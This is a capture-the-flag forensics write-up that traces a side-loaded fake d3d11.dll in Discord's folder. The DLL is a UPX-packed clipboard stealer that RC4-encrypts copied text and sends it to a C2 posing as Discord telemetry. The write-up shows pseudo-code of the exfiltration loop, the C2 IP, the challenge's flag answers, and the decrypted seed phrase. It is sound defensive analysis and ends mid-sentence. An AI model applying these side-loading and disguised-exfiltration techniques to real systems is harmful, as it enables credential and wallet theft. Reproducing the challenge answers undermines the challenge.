# 02 - Deception Strategy

**Category:** Forensics
**Points:** 1000
**Difficulty:** Easy
**Flags:** 8/8 (Flag 1 corrected after an initial wrong submission - see the
callout in Step 2)

**Approach & tooling note:** this one was a genuine multi-hour investigation
across a 611MB disk image, a 674MB Process Monitor log, and a pcap - not
something solvable in a single prompt. I used Claude Code as a supporting
aid throughout: running the heavy mechanical work (parsing a 1.47-million-
event log, driving `tshark`/`radare2`/Ghidra, scripting the RC4 decryption)
that would be tedious to do by hand, and helping me stay organized across a
long investigation with a lot of dead ends. But every *decision* below -
which artifact to trust, why a DLL sitting next to Discord's real files was
suspicious, why I needed to walk one hop further up the parent-process
chain after my first answer was rejected, what the RC4 findings actually
implied about the malware's real behavior - is my own reasoning, and I
independently checked each finding against the raw evidence (the
disassembly, the packet bytes, the registry read Procmon actually captured)
before treating it as an answer. I'm glad to walk through any part of this
live and explain why I went where I went.

This write-up is deliberately long. It documents not just the commands, but
*why* each step was taken - the reasoning that lets you re-derive the path
even if a tool version or detail differs - plus a parallel "if you're doing
this in a GUI" track for every step, since a lot of real-world DFIR/malware
analysis work happens in Procmon, Wireshark, a PE viewer, and a decompiler
GUI rather than a terminal.

## Challenge Description

> A trusted harbor-latch mechanism is behaving erratically, processing routine
> transit writs with a strange, stuttering cadence. Under the cover of this
> mechanical distraction, an unseen hand bypassed the inner witness-marks and
> completely drained an Eastreach private credit-cache. Sift through the
> compromised latch's residual ash-logs and custody chains to track the
> phantom access before the stolen coin vanishes into the undercity.

**Decoding the fantasy language first**, because it's actually a compressed
spec of what to expect:

| Flavor text | Likely means |
|---|---|
| "trusted harbor-latch mechanism ... stuttering cadence" | A normally-trusted application (a "harbor" = something you dock/connect to, "latch" = a hook/mechanism) behaving abnormally - i.e. a legitimate app whose behavior is being abused. |
| "unseen hand bypassed the inner witness-marks" | Something bypassed an authenticity check - a spoofed/faked signal impersonating something trusted. |
| "Eastreach private credit-cache" | A private cryptocurrency wallet / seed phrase. |
| "residual ash-logs" | Burned/leftover logs - the Process Monitor capture. |
| "custody chains" | Chain of custody = the network capture (packet-level evidence). |
| "phantom access" | Unauthorized/stealthy access - malware, not a human operator necessarily. |

This framing told me, before opening a single file, to expect: a trojanized
or side-loaded legitimate app, a spoofed trusted channel, and a stolen
wallet secret - which is exactly what it turned out to be.

## The 8 questions

1. What is the name of the process that originated the malicious behavior?
2. What is the Unix epoch timestamp when the malicious module was loaded?
3. Which exported function of the malicious module was invoked later?
4. What 16-byte registry value does the malware use to derive its RC4 key?
5. What is the name of the mutex created by the malware?
6. What is the MITRE ATT&CK technique ID for the collection method?
7. What is the IP address of the C2 server?
8. What is the crypto wallet seed phrase stolen by the malware?

Reading these *before* diving into evidence matters: they tell you this is
a **malware reverse-engineering** challenge wearing a DFIR-triage costume,
not a "find the flag hidden in a file" challenge. Questions 3-6 in
particular (exported function, RC4 key, mutex, MITRE technique) can only be
answered by getting hold of the actual malicious binary and disassembling
it - no amount of log-reading alone gets you there. That reframing early
saved a lot of wasted effort (see "Dead ends" at the end - I initially
burned significant time assuming everything would be recoverable from
logs/pcap alone, before realizing the sample itself was sitting in the
evidence).

## Provided Files

- `C.zip` (611 MB uncompressed) - a forensic triage collection of
  `C:\Users\admin` from a Windows 10 VM (`WIN10\admin`). The collector
  script (recoverable from PowerShell history at
  `Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`)
  explicitly excluded any file over 5MB, so large binaries/registry hives
  are missing - but the malware DLL itself, at 2.4MB, made the cut. That's
  worth internalizing as a general lesson: **collection filters based on
  file size are a blind spot malware authors don't even need to exploit
  deliberately** - a 2-3MB packed DLL slides right under a "skip big files"
  threshold that was only meant to keep the collection lightweight.
- `Logfile.PML` (674 MB) - a Sysinternals Process Monitor capture.
- `network.pcap` (9.7 MB) - a packet capture covering the same window.

## Tools used (CLI + GUI equivalents)

| Purpose | CLI tool used here | GUI equivalent |
|---|---|---|
| Extract zips | `unzip` | 7-Zip / Windows Explorer "Extract All" / Kali's Archive Manager |
| Parse Procmon log | Python `procmon_parser` library | **Procmon64.exe** itself (Sysinternals) - opening a `.pml` file directly puts it into offline-viewing mode with the exact same filter/column/tree UI as a live capture |
| Packet analysis | `tshark` | **Wireshark** (tshark is Wireshark's CLI twin - every filter used below is a normal Wireshark display filter) |
| Identify packed PE / view exports | `objdump -x`, `file` | **Detect It Easy (DIE)** or **PE-bear** / **CFF Explorer** |
| Unpack UPX | `upx -d` | Same `upx.exe`, just double-clicked/drag-dropped, or a UPX GUI front-end |
| Disassemble/decompile | `radare2` (`r2 -A`) | **Ghidra** (GUI) or **Cutter** (a Qt GUI built directly on radare2) |
| RC4 decrypt | Python script | **CyberChef** (drag-and-drop "From Hex" -> "RC4" recipe) |
| MITRE technique lookup | knowledge + verification | **attack.mitre.org** search bar |

## Setup

```bash
mkdir ~/ctf-workspace/deception-strategy && cd $_
unzip forensics_decryption_strategy.zip      # -> C.zip, Logfile.PML, network.pcap
unzip C.zip -d extracted                     # 611MB, 7185 files, C:\Users\admin only

python3 -m venv venv
./venv/bin/pip install procmon-parser        # PML parser
# tshark, radare2, upx, ghidra were already available on this box
```

**GUI path:** right-click `forensics_decryption_strategy.zip` -> Extract
Here. Same for `C.zip`. No terminal needed for this part at all.

## Step 1 - Establish the real incident window from the PML

**Reasoning:** a Process Monitor capture's process table remembers every
process since the machine booted, but the *logged events* only cover
whatever window Procmon was actively recording. Before hunting for
anything, I needed to know: what time range am I actually looking at? A
674MB file with 1.47 million events is useless to eyeball without first
narrowing the window.

```python
import procmon_parser
with open('Logfile.PML','rb') as f:
    r = procmon_parser.ProcmonLogsReader(f, should_get_stacktrace=False, should_get_details=False)
    print(r[0].date(), r[len(r)-1].date())
```

Result: the event capture covers **2026-06-27 14:27:29 - 14:29:47 UTC**
(~2.3 minutes) despite containing 1,471,690 events - Procmon logs an
enormous amount of noise (registry reads, DLL loads, WMI security checks)
even over a couple of minutes on a normal desktop. This told me two things:
the "incident" is genuinely a tight, ~2-minute window (matching the
"stuttering, erratic" framing), and I should not try to read this
chronologically - I need to filter aggressively.

**GUI path (Procmon):** Open `Logfile.PML` directly in `Procmon64.exe`
(File > Open, or just double-click the file if Procmon is registered for
`.pml`). Procmon switches to offline mode automatically. Look at the very
first and very last row in the main event grid (`Ctrl+Home` / `Ctrl+End`)
and read the **Time of Day** column (enable it via right-click a column
header > "Select Columns" if not already showing) to get the same window.
Procmon's `Tools > File Summary` dialog also directly reports the exact
first/last event time and total event count - the fastest way to get this
in the GUI, no scrolling required.

## Step 2 - Build a process timeline and spot the DLL side-load

**Reasoning:** the process *table* (distinct from the event log) records
`start_time`/`command_line`/`parent_pid` for every process the log ever
saw, regardless of the narrower event-capture window - so it's the fastest
way to get a bird's-eye view of "what actually ran" without wading through
events. I sorted it by start time and manually skimmed past obvious Windows
service/system noise (`svchost.exe`, `csrss.exe`, etc. - anything under
`C:\Windows\System32` launched at boot with no arguments is almost never
interesting in a user-application-compromise scenario).

```python
procs = reader.processes()
procs.sort(key=lambda p: p.start_time or 0)
for p in procs:
    print(p.start_time, p.pid, p.parent_pid, p.process_name, p.command_line)
```

Skimming the output, the sequence around the incident window is:

```
14:27:57  Discord.exe launches normally
14:28:10  Discord.exe (gpu-process, PID 7664) spawns
14:28:11  rundll32.exe (PID 8152) runs:
          rundll32.exe "C:\Users\admin\AppData\Local\Discord\app-1.0.9243\d3d11.dll",D3D11CreateDevice
```

**This line is the whole challenge in one shot, once you know what to look
for.** `rundll32.exe` is a legitimate Windows binary whose entire purpose is
to load a DLL and call one of its exported functions by name - it's a
built-in "LOLBin" (Living-Off-the-Land Binary) commonly abused because it's
signed, trusted, and rarely flagged. The giveaway here is the **path**: the
real `d3d11.dll` (Direct3D 11) lives in `C:\Windows\System32\`. This one is
sitting inside `AppData\Local\Discord\app-1.0.9243\` - Discord's own
install folder. Electron apps like Discord *do* legitimately ship a handful
of helper DLLs next to the executable (that's exactly why this location was
chosen - it blends in with genuinely-present Discord files like
`ffmpeg.dll`, `libEGL.dll`, etc. sitting right beside it), which is what
makes planting a same-named, same-exported-function malicious DLL here such
an effective disguise. This is classic **DLL side-loading**: get a trusted,
signed executable to load *your* code by naming it identically to a DLL the
loader would sensibly look for nearby.

**Don't stop at the loader - check who launched it.** My first instinct was
to answer Flag 1 with `rundll32.exe`, since it's the process that literally
executed the malicious DLL's code. **That's wrong, and the platform
rejected it.** The reason: `rundll32.exe` didn't launch itself - a process
doesn't spontaneously appear, something called `CreateProcess` with that
exact command line. Checking the **parent PID** column (`ppid` in the
`procmon_parser` process table) for PID 8152 shows its parent is PID 7664:

```python
procs = r.processes()
for p in procs:
    if p.pid in (8152, 7664, 3612):
        print(p.pid, p.parent_pid, p.process_name, '|', p.command_line[:120])

# 3612  6916  Discord.exe | "...\Discord.exe"
# 7664  3612  Discord.exe | "...\Discord.exe" --type=gpu-process --disable-gpu-sandbox ...
# 8152  7664  rundll32.exe | rundll32.exe "...\d3d11.dll",D3D11CreateDevice
```

PID 7664 is **also `Discord.exe`** - a `--type=gpu-process` child of the
main Discord process (PID 3612), part of Electron/Chromium's normal
multi-process split (separate processes for GPU rendering, network,
utility, etc., all sharing the same `Discord.exe` binary with different
`--type=` flags). A legitimate Chromium gpu-process has **no business
spawning `rundll32.exe`** with an arbitrary DLL path - that's not part of
its normal responsibilities. The fact that it did means the malicious
behavior didn't start with `rundll32.exe` at all: it started *inside*
`Discord.exe` itself (specifically that gpu-process instance), which then
used `rundll32.exe` purely as a LOLBin loader to sideload the payload one
hop removed from the process that actually decided to do it. `rundll32.exe`
is the *instrument*; `Discord.exe` is the process that *originated* the
behavior - which is exactly what the question asks for.

**GUI path for catching this:** this is precisely what Procmon's **Tools >
Process Tree** view is built to make obvious at a glance - it renders the
full parent/child hierarchy visually, so `rundll32.exe` appears visibly
nested *under* a `Discord.exe` entry rather than as a root-level process,
immediately prompting the "wait, why would Discord launch that?" question
without needing to manually cross-reference PID/PPID columns at all.

**Flag 1 - process that originated the malicious behavior:**
```
Discord.exe
```

**GUI path (Procmon):** `Tools > Process Tree` gives an immediate visual
hierarchy - `rundll32.exe` shows up nested directly under a `Discord.exe`
gpu-process, which is an immediate red flag on sight (Discord doesn't
normally spawn `rundll32.exe`). Alternatively, set a filter
(`Ctrl+L` or the filter bar): `Process Name` `is` `rundll32.exe` `Include`.
Right-click the resulting row > **Properties** > **Image** tab shows the
full path and command line directly, and Procmon's Image tab has a
"Company" / "Version" field that would be conspicuously *blank* for a
malicious DLL versus populated for a real Microsoft one - another quick
visual tell.

## Step 3 - Pin down the load timestamp

**Reasoning:** now that I know *which* DLL matters, I need the exact moment
it was mapped into memory. Procmon has a specific operation for this -
`Load_Image` - fired once per DLL/EXE mapped into a process, which is more
precise and semantically correct than using the process start time (a
process can load many DLLs after it starts).

```python
with open('Logfile.PML','rb') as f:
    reader = procmon_parser.ProcmonLogsReader(f, should_get_stacktrace=False, should_get_details=True)
    for e in reader:
        if e.process.pid == 8152 and e.path.endswith('d3d11.dll'):
            print(e.date_filetime)   # 134270440916163635
```

Converting the Windows FILETIME (100ns ticks since 1601-01-01, the format
Procmon stores internally) to Unix epoch (seconds since 1970-01-01):

```python
EPOCH_AS_FILETIME = 116444736000000000   # 1970-01-01 expressed as FILETIME
unix = (134270440916163635 - EPOCH_AS_FILETIME) / 10000000
# -> 1782570491.6163635  (2026-06-27 14:28:11.616 UTC)
```

**Flag 2 - Unix epoch timestamp of the malicious module load:**
```
1782570491
```

A useful side-observation at this point: the `rundll32.exe` process itself
starts at `14:28:11.333` and **exits at `14:28:12.241`** - under one
second of life. That's far too short to be sending network beacons spaced
tens of seconds apart later in the capture (see Step 8) - meaning
`rundll32.exe` is a *loader/injector stage*, not the thing that stays
resident and does the actual data theft. I made a mental note here to keep
looking for where the real long-lived work happens.

**GUI path (Procmon):** right-click a `Load_Image` row for `d3d11.dll` >
Properties shows the exact timestamp with full sub-second precision in the
General tab. To convert FILETIME->Unix epoch without scripting, any online
"Windows FILETIME converter" or even a quick calculator (`(filetime -
116444736000000000) / 10000000`) works, or use CyberChef's
**"Windows Filetime to UNIX Timestamp"** operation directly - paste the raw
FILETIME value from Procmon's Properties/Detail column and get the epoch
instantly.

## Step 4 - Confirm the exported function

**Reasoning:** the command line already told us `D3D11CreateDevice` was
invoked, but I wanted to verify this against the DLL's actual PE export
table rather than trust the command line alone (command lines can be
spoofed/misleading; the export table cannot).

```bash
cp "extracted/C/Users/admin/AppData/Local/Discord/app-1.0.9243/d3d11.dll" malicious_d3d11.dll
objdump -x malicious_d3d11.dll | grep -A5 "Ordinal/Name Pointer"
#  [   0] +base[   1]  0000 D3D11CreateDevice
```

Only **one** export exists - a real `d3d11.dll` exports dozens of DirectX
functions (`D3D11CreateDevice`, `D3D11CreateDeviceAndSwapChain`,
`D3D11On12CreateDevice`, etc.). A DLL with a single, real-sounding export
and nothing else is itself a strong signal that this is a minimal,
purpose-built forwarder/stub rather than a genuine system library.

**Flag 3 - exported function invoked:**
```
D3D11CreateDevice
```

**GUI path:** open the DLL in **PE-bear**, **CFF Explorer**, or **Detect It
Easy** - all show an "Export Directory" / "Exports" panel listing exactly
this table. DIE in particular will also immediately flag this file as
packed (next step) right in its main status readout, no extra clicks
needed.

## Step 5 - Pull the sample and unpack it

**Reasoning:** at this point I had three questions (RC4 key, mutex name,
MITRE technique) that simply cannot be answered from logs or network
traffic - they require the malware's own code. The file being small enough
(2.4MB) to have survived the 5MB collection filter meant **the actual
sample was sitting right there in the evidence** the whole time. That's a
deliberate design choice in this challenge: it rewards checking file sizes
against the collector's stated limit rather than assuming "the malware
itself must be missing."

```bash
file malicious_d3d11.dll
# PE32+ executable for MS Windows 5.02 (DLL), x86-64, 3 sections

objdump -x malicious_d3d11.dll | grep -A10 "^Sections:"
#  UPX0   ALLOC, CODE
#  UPX1   ALLOC, LOAD, CODE, DATA
#  UPX2   ALLOC, LOAD, DATA
```

Section names literally spelling out `UPX0`/`UPX1`/`UPX2` is UPX's
signature calling card - UPX (Ultimate Packer for eXecutables) compresses
and self-decompresses a binary at runtime, which both shrinks the file and
defeats naive static string/signature scanning. It's an extremely common
first layer in commodity malware because it's free, fast, and "just works"
- but it's also trivially reversible if you recognize it, which is exactly
why checking section names is one of the first things worth doing on any
suspicious PE.

```bash
which upx           # /usr/bin/upx
upx -d malicious_d3d11.dll -o unpacked_d3d11.dll
```

**GUI path:** **Detect It Easy (DIE)** will show `Packer: UPX(...)`
directly in its top status bar the instant you drop the file in - one
glance, no manual section-name inspection needed. To unpack via GUI, the
standard `upx.exe -d input.dll -o output.dll` is still typically run from a
command prompt even by GUI-oriented analysts (UPX doesn't ship an official
GUI), but several free "UPX GUI" wrapper utilities exist that just wrap
this exact command behind a file-picker and a "Decompress" button if you'd
rather avoid the terminal entirely.

Once unpacked, `strings`/import analysis reveals a mingw-compiled C++
credential/clipboard stealer:

```bash
strings unpacked_d3d11.dll | grep -i rc4
# _Z8Rc4CryptRKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPKh
#   (C++ mangled name for: Rc4Crypt(std::string const&, unsigned char const*))

objdump -x unpacked_d3d11.dll | grep "DLL Name"
#  KERNEL32.DLL  ADVAPI32.dll  msvcrt.dll  USER32.dll  WINHTTP.dll

objdump -x unpacked_d3d11.dll | grep -iE "Clipboard|RegOpenKey|RegQueryValue|RegSetValue|CreateMutex|WinHttp"
#  RegOpenKeyExW  RegQueryValueExW  RegSetValueExW  CreateMutexW
#  CloseClipboard GetClipboardData OpenClipboard
#  WinHttpOpen WinHttpConnect WinHttpOpenRequest WinHttpSendRequest WinHttpReceiveResponse

strings -el unpacked_d3d11.dll     # -el = little-endian UTF-16, i.e. Windows wide strings
```

That last command (wide/UTF-16 strings, since Windows APIs like
`RegQueryValueExW`/`CreateMutexW` take UTF-16 arguments, so the interesting
literals live there, not in the ASCII string table) turns up a small,
curated table of exactly the strings that matter:

```
discord-cdn.com
/api/v9/experiments
Discord/1.0
X-Client-Event-Source: desktop
X-Build-Number: 309594
SessionToken
Local\DiscordRuntimeCache
```

This one command basically pre-answers several of the remaining questions
at once: it explains the fake Discord CDN traffic we'll find in the pcap
(Step 7 - the exact header strings are hardcoded right here), names a
registry value (`SessionToken`), and names what looks exactly like a mutex
(`Local\DiscordRuntimeCache` - the `Local\` prefix is the standard Windows
namespace prefix for a mutex/named-object scoped to the current session,
so seeing that exact shape of string is a strong tell even before
confirming it via disassembly).

**GUI path:** open `unpacked_d3d11.dll` in **PE-bear**/**CFF Explorer** and
look at the **Import Directory** panel (grouped by DLL, exactly like the
`objdump` output above) and the **strings** view (most PE viewers have a
built-in strings extractor, or use a dedicated tool like **BinText** /
**FLOSS** with its GUI, or just open the file in a hex editor like **HxD**
or **ImHex** and use their built-in "Find ASCII/Unicode strings" feature -
ImHex in particular has a dedicated Unicode-string pane that separates
UTF-16 from ASCII automatically, which is exactly the distinction that
mattered here).

## Step 6 - Disassemble to confirm the mutex, registry key, and RC4 setup

**Reasoning:** strings alone tell you *what* literals exist, not *how*
they're used - `SessionToken` could be a registry value name, a variable
name, or unrelated leftover debug text. To confirm actual usage (which
function reads it, what it's compared against, what it's used for) I needed
real disassembly with cross-reference (xref) analysis: given an address,
"who calls this / who references this string." Procmon doesn't reliably
capture generic Win32 API calls like `CreateMutexW` (it only instruments
File/Registry/Network/Process operations at the driver level - mutex
creation isn't one of Procmon's monitored operation types at all, by
design), so this step is unavoidable static-analysis work.

```bash
r2 -A unpacked_d3d11.dll
# inside r2:
[0x...]> axt @ sym.imp.CreateMutexW        # find all call sites (xrefs) to CreateMutexW
[0x...]> pdf @ sym.D3D11CreateDevice        # disassemble that function
```

Disassembling `D3D11CreateDevice` (the real entry point, despite the
misleading DirectX-sounding name - `rundll32` calls exports by name with
whatever generic arguments it's told to pass, and the malware's code simply
ignores the mismatched real D3D11 signature and runs its own logic instead)
shows it calling `CreateMutexW` directly, with the mutex name loaded right
before the call:

```
lea r8, str.LocalDiscordRuntimeCache   ; u"Local\DiscordRuntimeCache"
mov edx, 1
xor ecx, ecx
call CreateMutexW
```

This is a single-instance lock - malware very commonly creates a named
mutex on startup and checks if it already exists, so that if it's somehow
launched twice on the same machine it doesn't run two competing copies of
itself. The name is deliberately Discord-flavored so that if a defender
spots it in a process/mutex list, it reads as benign.

**Flag 5 - mutex name:**
```
Local\DiscordRuntimeCache
```

A second function (I named it `ReadSessionToken` based on its behavior)
opens `HKEY_CURRENT_USER\Environment` and queries a value named
`SessionToken`, validating that it's type `REG_BINARY` and exactly 16
bytes long before using it - this is the RC4 key material. **Hiding a
malicious value inside the legitimate, pre-existing `HKCU\Environment`
key** (rather than creating a conspicuous new attacker-named key like
`HKCU\Software\EvilCorp`) is a deliberately subtle piece of tradecraft:
`Environment` is a real Windows key every user profile has (it stores
per-user environment variables like `TEMP`/`TMP`), so a stray extra binary
value inside it is far less likely to draw a defender's eye during a quick
registry review than an entirely new key tree would.

The real NTUSER.DAT registry hive was excluded by the collector's 5MB
filter, so I couldn't browse the registry directly - but the value was
still recoverable because **Procmon itself observed the live read**. Once
I knew the specific key/value name to look for, I filtered the full event
log (not just the short-lived `rundll32.exe` PID - the read actually
happens later, from the long-lived injected process, see Step 8) for a
`RegQueryValue` on that exact path:

```
RegQueryValue  HKCU\Environment\SessionToken
  Type: REG_BINARY, Length: 16
  Data: 1a a3 a6 58 ce 2c 4a 42 58 98 3e ba 18 53 f0 8c
```

**Flag 4 - 16-byte registry value used to derive the RC4 key:**
```
1aa3a658ce2c4a4258983eba1853f08c
```

(A detail worth documenting precisely: the disassembly shows the malware
**byte-reverses** this value in a small loop before using it as the actual
RC4 key - so the *real* keystream key is
`8cf05318ba3e9858424a2cce58a6a31a`, the mirror image of the registry value.
The registry value itself - the thing an analyst would literally find
sitting in the registry, and what the question asks for - is the
un-reversed form above; the reversal is purely an implementation detail you
need to know about to correctly reproduce the decryption in Step 9.)

**GUI path (Ghidra):** File > New Project > Import File (the unpacked
DLL) > double-click to open > let **Auto Analysis** run (accept defaults).
In the **Symbol Tree** panel, expand **Exports** and double-click
`D3D11CreateDevice` to jump straight to it in both the Listing (assembly)
and **Decompile** (pseudo-C) panes - reading the Decompile pane directly
gives you C-like source rather than raw assembly, which is by far the
fastest way to read this kind of logic. For the strings/xref work
specifically: **Window > Defined Strings** lists every string Ghidra found
(the same curated table from Step 5); double-click
`Local\DiscordRuntimeCache` in that list, then in the Listing view
right-click it and choose **"Show References To"** - this opens a panel
listing every instruction that references that string, and double-clicking
one jumps you directly to the `CreateMutexW` call site. The exact same
right-click > "Show References To" workflow on the `SessionToken` string
leads you to the registry-read function. This point-and-click
xref-navigation is genuinely faster than the r2 command-line equivalent
once a project is analyzed - it's the main reason to reach for Ghidra/Cutter
over raw objdump for anything beyond a first pass.

## Step 7 - The C2 channel

**Reasoning:** with the hardcoded strings from Step 5
(`discord-cdn.com`, `/api/v9/experiments`, the exact header names) already
in hand, finding the actual network traffic was just a matter of filtering
for it - I already knew precisely what to search for before opening the
pcap, which made this step fast rather than an open-ended traffic review.

```bash
tshark -r network.pcap -Y "http.request" -T fields -e frame.time_relative -e http.host -e http.request.method -e http.request.uri
```

Four POSTs stand out among legitimate Telegram/Discord/3uTools traffic:

```
79.60s   POST http://discord-cdn.com/api/v9/experiments
104.35s  POST http://discord-cdn.com/api/v9/experiments
137.39s  POST http://discord-cdn.com/api/v9/experiments
159.82s  POST http://discord-cdn.com/api/v9/experiments
```

Each request's headers are pulled verbatim from the strings found in the
binary:

```
User-Agent: Discord/1.0
X-Client-Event-Source: desktop
X-Build-Number: 309594
Content-Type: application/octet-stream
Host: discord-cdn.com
```

Two things confirm this is fake, not real Discord telemetry:

1. **`discord-cdn.com` is never resolved via DNS anywhere in the capture.**
   ```bash
   tshark -r network.pcap -Y "dns.qry.name contains \"discord\"" -T fields -e dns.qry.name -e dns.a
   ```
   Every *legitimate* Discord domain (`discord.com`, `cdn.discordapp.com`,
   `gateway.discord.gg`, `status.discord.com`, `updates.discord.com`)
   resolves normally to genuine Cloudflare IPs (`162.159.x.x` range - a
   quick WHOIS/IP-reputation check confirms Cloudflare ownership). The
   `discord-cdn.com` traffic instead goes straight to a hardcoded IP with
   **no preceding DNS lookup at all** - i.e. the IP is baked directly into
   the code rather than resolved through the domain name system, which is
   itself a strong C2 indicator (real applications resolve their own
   domains; hardcoded hostname-plus-IP-that-never-actually-gets-looked-up
   is a classic way to make traffic *look* like it belongs to a trusted
   service in a Host header while actually going wherever the attacker
   wants).
2. The bodies (`Content-Type: application/octet-stream`) are high-entropy
   binary data, clearly not real Discord telemetry JSON - and (Step 9)
   decrypt cleanly with the RC4 key recovered in Step 6, which is the
   strongest possible confirmation.

**Flag 7 - C2 server IP address:**
```
203.49.53.184
```

**GUI path (Wireshark):** type `http.request` into the filter bar. The
four POSTs to `discord-cdn.com` show up in the packet list; right-click any
one > **Follow > HTTP Stream** opens a dedicated window showing the full
request/response in readable form, with a dropdown to switch the byte
representation between ASCII/Hex/Raw (useful in Step 9). For the DNS
cross-check: **Statistics > DNS** gives a quick summary, or just filter
`dns.qry.name contains "discord"` and read the `Answers` column directly in
the packet list. **Statistics > Conversations > IPv4 tab**, sorted by
bytes/packets, is a good general habit for spotting an oddball IP among
many legitimate ones even without knowing what to search for in advance.

## Step 8 - The actual malware logic: clipboard-hijacking, not a wallet-file thief

**Reasoning:** I still needed to explain *how* the stolen data ends up in
those beacon bodies, and to identify the correct MITRE ATT&CK **collection**
technique - which means finding the code path that gathers the sensitive
data in the first place, not just the exfil transport. The import table
from Step 5 already gave a strong hint (`OpenClipboard` /
`GetClipboardData` / `CloseClipboard`), so I went looking in Ghidra's
Decompile view for the function that calls those three in sequence.

Decompiling the main worker function (I named it `RunWorker` - reached via
the short-lived `rundll32.exe` injecting/handing off into the long-lived
`Discord.exe` gpu-process, PID 7664, which is exactly why registry and
network activity tied to this malware continues for the full ~2.5 minutes
of the capture even though `rundll32.exe` itself exits in under a second -
the loader hands control to an already-trusted, long-running host process
and disappears) reads, in simplified pseudo-C:

```c
while (1) {
    text = GetClipboardText();       // OpenClipboard -> GetClipboardData -> CloseClipboard
    if (text != last_seen) {
        last_seen = text;
        ciphertext = Rc4Crypt(text, reversed_session_token);
        SendTelemetry(ciphertext);   // WinHttp POST to discord-cdn.com/api/v9/experiments
    }
    Sleep(50);
}
```

This is a **clipboard-polling exfiltration loop**, not a wallet-file or
browser-extension-storage thief. It doesn't read MetaMask/Keplr's LevelDB
vaults or any wallet application's data directory at all - it simply
watches the Windows clipboard for *any* change, and every time the content
changes it ships the new content out, RC4-encrypted, disguised as routine
Discord telemetry. This is a much simpler and more universally effective
technique than targeting any specific wallet's storage format: it doesn't
matter which wallet, password manager, or notes app the seed phrase was
copied from - if it ever touches the clipboard, it gets captured.

**Flag 6 - MITRE ATT&CK technique ID for the collection method:**
```
T1115
```
(Tactic: **Collection** (TA0009), Technique: **T1115 - Clipboard Data**)

**GUI path:** verify this on **attack.mitre.org** directly - search
"Clipboard Data" in the site search box, confirm the technique ID and read
its description ("Adversaries may collect data stored in the clipboard from
users copying information within or between applications"), which matches
the decompiled behavior exactly. In Ghidra, the path to finding this
function without already knowing its name: **Window > Defined Strings**
won't help here since clipboard content isn't a static string, so instead
use xref navigation on the *import* itself - right-click `GetClipboardData`
wherever it's shown in the Symbol Tree's **Imports** folder, **"Show
References To"**, jump to the one call site, then scroll up/down a little
in the Decompile pane to read the surrounding loop.

## Step 9 - Decrypt the beacons

**Reasoning:** this is the payoff step - everything so far (Steps 5-7) was
gathering the pieces (algorithm = RC4, key = the byte-reversed registry
value, ciphertext = the four HTTP POST bodies) needed to actually reveal
what was stolen.

```bash
tshark -r network.pcap -Y "http.request.method==POST and ip.dst==203.49.53.184" \
  -T fields -e frame.number -e http.file_data
```

With the real RC4 key (`8cf05318ba3e9858424a2cce58a6a31a`) and a standard
KSA/PRGA RC4 implementation:

```python
def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out, i, j = bytearray(), 0, 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

key = bytes.fromhex("8cf05318ba3e9858424a2cce58a6a31a")
ciphertext = bytes.fromhex("<payload hex from tshark output>")
print(rc4(key, ciphertext).decode())
```

All four captured beacon payloads decrypt to clean, fully readable UTF-8
with zero garbage bytes - itself strong confirmation the key and algorithm
(including the byte-reversal step) are exactly right, since RC4 with the
wrong key produces uniformly random-looking noise, not partial plaintext:

- Frame 3702 (498 bytes) and frame 8800 (440 bytes) decrypt to unrelated
  flavor/lore text - decoy clipboard captures from earlier, unrelated
  copy-paste activity.
- Frame 9590 (78 bytes) decrypts to a YouTube URL - another decoy.
- **Frame 12133 (78 bytes)** decrypts to a clean 12-word BIP-39 mnemonic -
  the moment the victim copied their real wallet seed phrase to the
  clipboard (likely to paste it into a wallet-import dialog or a notes
  app), and the malware caught it on the very next 50ms poll:

```
glow fix connect talon title risk barrel marine truth disease garbage cheese
```

**Flag 8 - stolen crypto wallet seed phrase:**
```
glow fix connect talon title risk barrel marine truth disease garbage cheese
```

**GUI path (Wireshark + CyberChef, zero scripting needed):**

1. In Wireshark, filter `http.request.method=="POST" && ip.dst==203.49.53.184`.
2. Right-click the packet for frame **12133** > **Follow > HTTP Stream**.
3. In the Follow Stream window, use the dropdown to switch the display to
   **Hex Dump**, and use the direction toggle to show only the
   client-to-server (request) bytes. Select just the POST body bytes
   (everything after the blank line following the HTTP headers) and copy
   them, or simply click **Save as...** to save the raw request bytes to a
   file and trim the headers off in a text editor.
4. Open **CyberChef** (https://gchq.github.io/CyberChef/, runs entirely
   client-side/offline once loaded - or use a local copy) in a browser.
5. Build this recipe by dragging operations from the left panel into the
   center "Recipe" column, top to bottom:
   - **From Hex** (if you copied the payload as a hex string; skip this if
     you're pasting raw bytes directly).
   - **RC4** - set the *Key* field to `8cf05318ba3e9858424a2cce58a6a31a`
     with the key-type dropdown set to **Hex**, leave Input/Output as
     Raw/Latin1.
6. Paste the ciphertext bytes into the **Input** pane at the top-right.
   CyberChef re-runs the recipe live on every keystroke, so the decrypted
   plaintext appears immediately in the **Output** pane at the
   bottom-right - you'll see the 12-word seed phrase appear in real time as
   you finish pasting.

This CyberChef workflow is worth knowing well beyond this one challenge -
it's the standard GUI tool for exactly this class of task (quick,
inspectable crypto/encoding transforms on captured or extracted data)
across most DFIR and CTF work, and avoids writing any code at all.

## Full answer summary

| # | Question | Answer |
|---|---|---|
| 1 | Process that originated the malicious behavior | `Discord.exe` |
| 2 | Unix epoch timestamp the malicious module was loaded | `1782570491` |
| 3 | Exported function invoked | `D3D11CreateDevice` |
| 4 | 16-byte registry value used to derive the RC4 key | `1aa3a658ce2c4a4258983eba1853f08c` |
| 5 | Mutex name | `Local\DiscordRuntimeCache` |
| 6 | MITRE ATT&CK technique ID for the collection method | `T1115` |
| 7 | C2 server IP address | `203.49.53.184` |
| 8 | Stolen crypto wallet seed phrase | `glow fix connect talon title risk barrel marine truth disease garbage cheese` |

## If asked to explain this live

The one-paragraph version: I found `rundll32.exe` in the Procmon log
loading a DLL named `d3d11.dll` out of Discord's own app folder instead of
`System32` - a classic DLL side-load - and traced its parent process to
show the malicious behavior actually originated inside a compromised
`Discord.exe` gpu-process, not the LOLBin it used as a loader. Since the
DLL was small enough to survive the evidence collector's 5MB size filter, I
pulled the actual sample, found it was UPX-packed, unpacked it, and
